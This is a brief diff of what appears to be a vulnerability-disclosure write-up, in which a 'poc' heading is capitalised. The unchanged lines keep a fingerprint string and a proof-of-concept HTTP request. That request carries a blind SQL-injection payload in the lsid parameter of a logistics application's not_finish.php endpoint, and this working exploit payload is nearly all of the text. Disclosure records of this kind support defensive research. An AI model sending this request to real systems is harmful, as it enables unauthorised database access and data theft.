@@ -8,7 +8,7 @@
 body="tmp_md5_pwd"
 ```
 
-## poc
+## POC
 
 ```java
 GET /logistics/home_warning/php/not_finish.php?do=getList&lsid=(SELECT+(CASE+WHEN+(6192=6193)+THEN+''+ELSE+(SELECT+9641+UNION+SELECT+2384)+END)) HTTP/1.1
